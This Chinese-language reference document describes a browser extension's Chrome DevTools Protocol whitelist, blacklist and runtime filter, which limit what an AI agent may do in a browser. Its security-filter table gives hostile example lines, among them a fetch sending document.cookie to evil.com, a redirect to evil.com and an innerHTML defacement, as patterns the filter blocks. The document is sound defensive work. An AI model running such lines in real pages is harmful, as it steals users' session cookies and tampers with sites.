# CDP 命令白名单参考

CDP（Chrome DevTools Protocol）通道通过严格的命令白名单控制 Agent 对浏览器的访问权限。本文档详细说明允许和禁止的命令及其原因。

## 设计原则

- **默认拒绝**：未在白名单中的命令一律阻止
- **只读优先**：默认白名单仅包含读取/观察类命令，不包含任何修改操作
- **永久黑名单不可覆盖**：即使管理员添加到自定义白名单，永久黑名单中的命令仍然被阻止
- **纵深防御**：白名单 + 安全过滤 + V8 throwOnSideEffect 三重保护

## 命令优先级

判定一个命令是否允许执行的优先级：

```
永久黑名单（最高） > 管理员自定义黑名单 > 默认白名单 / 管理员自定义白名单 > 默认拒绝
```

## 默认白名单（44 条命令）

以下命令默认允许。均为只读/观察类操作，不会修改页面状态。

### DOM 域 — 页面结构读取

| 命令 | 说明 |
|------|------|
| `DOM.enable` | 启用 DOM 域事件 |
| `DOM.disable` | 禁用 DOM 域事件 |
| `DOM.getDocument` | 获取文档根节点 |
| `DOM.querySelector` | CSS 选择器查找单个节点 |
| `DOM.querySelectorAll` | CSS 选择器查找所有匹配节点 |
| `DOM.describeNode` | 获取节点描述（类型、属性等） |
| `DOM.getBoxModel` | 获取元素盒模型（位置、尺寸） |
| `DOM.getOuterHTML` | 读取元素 HTML 内容 |
| `DOM.getAttributes` | 读取元素属性列表 |
| `DOM.getNodeForLocation` | 根据坐标定位节点 |
| `DOM.resolveNode` | 将节点转换为 Runtime 对象引用 |

**安全性**：仅读取 DOM 树信息，不修改任何节点。

### CSS 域 — 样式检查

| 命令 | 说明 |
|------|------|
| `CSS.enable` | 启用 CSS 域事件 |
| `CSS.disable` | 禁用 CSS 域事件 |
| `CSS.getComputedStyleForNode` | 获取计算后样式（最终渲染值） |
| `CSS.getMatchedStylesForNode` | 获取匹配的 CSS 规则 |
| `CSS.getInlineStylesForNode` | 获取内联样式 |

**安全性**：仅读取样式信息，不修改 CSS。

### Page 域 — 页面信息与截图

| 命令 | 说明 |
|------|------|
| `Page.enable` | 启用 Page 域事件 |
| `Page.disable` | 禁用 Page 域事件 |
| `Page.captureScreenshot` | 截取页面截图（PNG/JPEG） |
| `Page.getFrameTree` | 获取页面 frame 层级结构 |
| `Page.getLayoutMetrics` | 获取页面布局指标（视口、内容区域） |
| `Page.getNavigationHistory` | 获取导航历史记录 |

**安全性**：截图和信息读取不影响页面状态。

### Network 域 — 网络监控

| 命令 | 说明 |
|------|------|
| `Network.enable` | 启用网络事件监听 |
| `Network.disable` | 禁用网络事件监听 |
| `Network.getCookies` | 读取当前域的 Cookie |
| `Network.getResponseBody` | 读取已完成请求的响应体 |

**安全性**：仅监听和读取网络请求，不发起、拦截或修改请求。注意 Cookie 信息在审计日志中会被脱敏处理。

### Runtime 域 — JavaScript 执行（受安全过滤保护）

| 命令 | 说明 |
|------|------|
| `Runtime.enable` | 启用 Runtime 域事件 |
| `Runtime.disable` | 禁用 Runtime 域事件 |
| `Runtime.evaluate` | 执行 JavaScript 表达式（受安全过滤） |
| `Runtime.callFunctionOn` | 在指定对象上调用函数（受安全过滤） |
| `Runtime.getProperties` | 获取对象属性 |
| `Runtime.globalLexicalScopeNames` | 获取全局变量名列表 |

**安全性**：`evaluate` 和 `callFunctionOn` 虽然在白名单中，但会经过额外的安全过滤（见下方「安全过滤机制」章节）。V8 引擎的 `throwOnSideEffect: true` 参数提供最后一道防线。

### Console 域 — 控制台监控

| 命令 | 说明 |
|------|------|
| `Console.enable` | 启用控制台消息收集 |
| `Console.disable` | 禁用控制台消息收集 |

**安全性**：仅收集控制台输出，不执行代码。

### Overlay 域 — 元素高亮

| 命令 | 说明 |
|------|------|
| `Overlay.enable` | 启用覆盖层 |
| `Overlay.disable` | 禁用覆盖层 |
| `Overlay.highlightNode` | 高亮指定元素 |
| `Overlay.hideHighlight` | 取消高亮 |

**安全性**：仅在浏览器层面绘制高亮覆盖层，不修改页面 DOM。

### Accessibility 域 — 无障碍树读取

| 命令 | 说明 |
|------|------|
| `Accessibility.enable` | 启用无障碍域 |
| `Accessibility.disable` | 禁用无障碍域 |
| `Accessibility.getFullAXTree` | 获取完整无障碍树 |
| `Accessibility.getPartialAXTree` | 获取部分无障碍树 |

**安全性**：仅读取无障碍树信息。

## 永久黑名单（44 条命令）

以下命令**永远不允许执行**，即使管理员将其添加到自定义白名单也无效。

### 导航控制 — 必须通过 Action Layer 操作

| 命令 | 禁止原因 |
|------|----------|
| `Page.navigate` | 强制页面跳转，可能导向恶意网站或触发非预期操作 |
| `Page.reload` | 刷新页面会丢失当前状态和未保存的用户数据 |
| `Page.navigateToHistoryEntry` | 操纵浏览历史可能绕过应用层的导航控制 |

### 调试器操纵

| 命令 | 禁止原因 |
|------|----------|
| `Debugger.enable` / `disable` | 调试器控制可挂起页面执行 |
| `Debugger.pause` / `resume` | 暂停/恢复执行流程影响用户体验 |
| `Debugger.setBreakpoint` | 设置断点可能导致页面卡死 |
| `Debugger.setBreakpointByUrl` | 同上 |
| `Debugger.removeBreakpoint` | 移除断点需要先有设置断点的权限 |

### Target 操纵 — 安全敏感

| 命令 | 禁止原因 |
|------|----------|
| `Target.createTarget` | 可能创建新标签页/窗口打开任意 URL |
| `Target.closeTarget` | 关闭用户正在使用的标签页 |
| `Target.attachToTarget` | 跨标签页调试可能访问其他域的敏感数据 |
| `Target.detachFromTarget` | 解除附加可能破坏其他 Agent 的会话 |
| `Target.createBrowserContext` | 创建隔离上下文可用于绕过安全策略 |
| `Target.disposeBrowserContext` | 销毁浏览上下文可能丢失会话状态 |

### 浏览器进程控制

| 命令 | 禁止原因 |
|------|----------|
| `Browser.close` | 关闭整个浏览器 |
| `Browser.crashGpuProcess` | 崩溃 GPU 进程导致渲染故障 |

### 安全策略绕过

| 命令 | 禁止原因 |
|------|----------|
| `Security.disable` | 禁用安全检查可能允许加载不安全内容 |
| `Security.setIgnoreCertificateErrors` | 忽略证书错误可能遭受中间人攻击 |

### Service Worker 操纵

| 命令 | 禁止原因 |
|------|----------|
| `ServiceWorker.unregister` | 注销 SW 会破坏 PWA 离线功能 |
| `ServiceWorker.skipWaiting` | 强制激活可能导致版本不一致 |

### 存储删除

| 命令 | 禁止原因 |
|------|----------|
| `Storage.clearDataForOrigin` | 清除站点数据会丢失用户登录状态和本地数据 |
| `Storage.clearCookies` | 清除 Cookie 会导致会话失效 |

### DOM 修改 — 必须通过 Action Layer 操作

| 命令 | 禁止原因 |
|------|----------|
| `DOM.setNodeValue` | 修改节点值 |
| `DOM.setAttributeValue` | 修改属性值（可能注入恶意属性） |
| `DOM.setOuterHTML` | 替换 HTML 内容（XSS 风险） |
| `DOM.removeNode` | 删除节点破坏页面结构 |
| `DOM.moveTo` | 移动节点改变页面布局 |
| `DOM.setNodeName` | 修改节点名称 |

### 输入模拟 — 必须通过 Action Layer 操作

| 命令 | 禁止原因 |
|------|----------|
| `Input.dispatchKeyEvent` | 模拟键盘输入可能触发表单提交或快捷键操作 |
| `Input.dispatchMouseEvent` | 模拟鼠标点击可能触发按钮、链接等交互 |
| `Input.dispatchTouchEvent` | 模拟触摸事件 |
| `Input.insertText` | 向输入框插入文本 |

### 网络拦截

| 命令 | 禁止原因 |
|------|----------|
| `Fetch.enable` / `fulfillRequest` / `continueRequest` / `failRequest` | 拦截和修改网络请求可能导致数据泄露或篡改 |
| `Network.setExtraHTTPHeaders` | 注入 HTTP 头可能泄露凭证或绕过安全检查 |
| `Network.emulateNetworkConditions` | 模拟网络环境可能影响其他功能的正常运行 |
| `Network.setCacheDisabled` | 禁用缓存影响性能 |

### 设备/环境模拟

| 命令 | 禁止原因 |
|------|----------|
| `Emulation.setDeviceMetricsOverride` | 修改设备指标可能导致页面渲染异常 |
| `Emulation.setGeolocationOverride` | 伪造地理位置信息 |

## 安全过滤机制

### Runtime 命令深度检查

`Runtime.evaluate` 和 `Runtime.callFunctionOn` 虽然在白名单中，但会经过额外的安全过滤。以下模式会被阻止：

| 类别 | 检测模式 | 示例 |
|------|----------|------|
| DOM 修改 | `innerHTML=`, `setAttribute()`, `appendChild()`, `removeChild()`, `remove()`, `insertAdjacentHTML()`, `document.write()` 等 | `document.body.innerHTML = '<h1>hacked</h1>'` |
| 页面导航 | `location=`, `window.open()`, `history.pushState()` 等 | `window.location = 'http://evil.com'` |
| 网络请求 | `fetch()`, `new XMLHttpRequest`, `new WebSocket`, `sendBeacon()` 等 | `fetch('http://evil.com/steal?data=' + document.cookie)` |
| 脚本注入 | `eval()`, `new Function()`, `setTimeout()`, `setInterval()` | `eval('malicious code')` |
| 存储修改 | `localStorage.setItem()`, `document.cookie=`, `indexedDB.open()` 等 | `localStorage.setItem('token', 'fake')` |
| 表单/交互 | `submit()`, `click()`, `dispatchEvent()` | `document.querySelector('form').submit()` |
| 样式修改 | `classList.add/remove/toggle()`, `style.property=` | `el.classList.add('hidden')` |

### V8 throwOnSideEffect 防护

除正则匹配外，`Runtime.evaluate` 调用时会设置 `throwOnSideEffect: true`，由 V8 引擎在执行层面阻止所有有副作用的操作。这是对正则模式匹配的补充防线，可以捕获混淆绕过的情况。

## 管理员自定义白名单

管理员可以通过扩展的设置页面或 `chrome.storage.sync` 添加/移除自定义白名单。

### 存储键

| 键 | 类型 | 说明 |
|----|------|------|
| `cdpCustomAllowed` | `string[]` | 额外允许的命令列表 |
| `cdpCustomBlocked` | `string[]` | 额外阻止的命令列表 |

### 使用示例

```javascript
// 添加自定义允许的命令
await chrome.storage.sync.set({
  cdpCustomAllowed: ['Performance.enable', 'Performance.getMetrics']
});

// 添加自定义阻止的命令（从默认白名单中移除）
await chrome.storage.sync.set({
  cdpCustomBlocked: ['Network.getCookies', 'Network.getResponseBody']
});
```

### 注意事项

1. **永久黑名单不可覆盖**：即使添加到 `cdpCustomAllowed`，永久黑名单中的命令仍然被阻止
2. **自定义黑名单优先于自定义白名单**：同一命令同时出现在两个列表中时，以阻止为准
3. **配置立即生效**：修改 `chrome.storage.sync` 后，白名单会自动重新加载
4. **谨慎添加**：添加自定义白名单前请确保理解命令的安全影响，建议参考 [Chrome DevTools Protocol 官方文档](https://chromedevtools.github.io/devtools-protocol/)

## 相关文件

| 文件 | 说明 |
|------|------|
| `extension/background/cdp-whitelist.js` | 白名单定义与检查逻辑 |
| `extension/background/cdp-safety.js` | 安全过滤与审计日志 |
| `extension/background/cdp-relay.js` | 命令执行管道（白名单→安全→执行→审计） |
| `test/cdp-whitelist-safety.test.js` | 白名单和安全过滤测试 |
